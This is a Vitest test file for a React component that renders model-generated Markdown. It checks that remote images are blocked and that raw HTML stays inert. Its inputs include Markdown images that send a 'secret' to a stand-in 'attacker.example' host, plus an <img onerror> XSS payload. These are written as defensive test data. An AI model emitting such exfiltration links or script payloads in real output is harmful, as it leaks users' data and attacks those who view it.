import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"
import { ChatMarkdown } from "./chat-markdown"

describe("model Markdown", () => {
  it("does not load remote images, including reference images", () => {
    const html = renderToStaticMarkup(
      createElement(ChatMarkdown, {
        content:
          "![data](https://attacker.example/image?secret=value)\n\n![reference][image]\n\n[image]: https://attacker.example/reference",
      })
    )
    expect(html).not.toContain("<img")
    expect(html).not.toContain("attacker.example")
  })
  it("keeps raw HTML inert and preserves ordinary Markdown links", () => {
    const html = renderToStaticMarkup(
      createElement(ChatMarkdown, {
        content:
          '<img src="https://attacker.example/pixel" onerror="alert(1)">\n\n[Docs](https://docs.example)',
      })
    )
    expect(html).not.toContain("<img")
    expect(html).toContain('href="https://docs.example"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
})
